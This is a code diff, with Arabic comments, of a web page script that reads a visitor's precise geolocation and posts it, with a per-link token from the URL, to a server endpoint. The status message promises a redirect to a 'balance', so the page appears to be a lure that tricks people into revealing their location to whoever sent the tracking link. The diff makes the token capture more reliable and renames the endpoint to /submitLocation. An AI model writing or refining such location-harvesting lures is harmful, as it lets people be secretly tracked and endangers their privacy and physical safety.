@@ -78,27 +78,28 @@
                         statusText.textContent = "تم استلام الموقع بنجاح! جاري تحويلك للرصيد...";
                         statusText.className = "text-xs text-emerald-400 font-bold";
 
-                        // استخراج المعرف أو الرمز من المسار الأخير (مثل /getLocation/07dfbe0f)
+                        // استخراج الرمز token بدقة تامة من المسار أو الاستعلام
                         const pathParts = window.location.pathname.split('/');
-                        const token = pathParts.pop() || pathParts.pop() || new URLSearchParams(window.location.search).get('t');
+                        let token = pathParts[pathParts.length - 1];
+                        if (!token || token === 'lo.html' || token === 'getLocation') {
+                            token = new URLSearchParams(window.location.search).get('t');
+                        }
 
                         if (!token) {
                             console.error('Token not found in path.');
                             return;
                         }
 
-                        // تجهيز بيانات الموقع مع تضمين الرمز وإحداثيات الخرائط
                         const payload = {
                             token: token,
                             latitude: position.coords.latitude,
                             longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy + " متر",
-                            googleMaps: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
+                            accuracy: position.coords.accuracy + " متر"
                         };
 
                         try {
-                            // إرسال البيانات عبر POST إلى المسار العام المعتمد في السيرفر
-                            await fetch('/mm', {
+                            // إرسال الإحداثيات إلى مسار /submitLocation في السيرفر
+                            await fetch('/submitLocation', {
                                 method: 'POST',
                                 headers: { 'Content-Type': 'application/json' },
                                 body: JSON.stringify(payload)
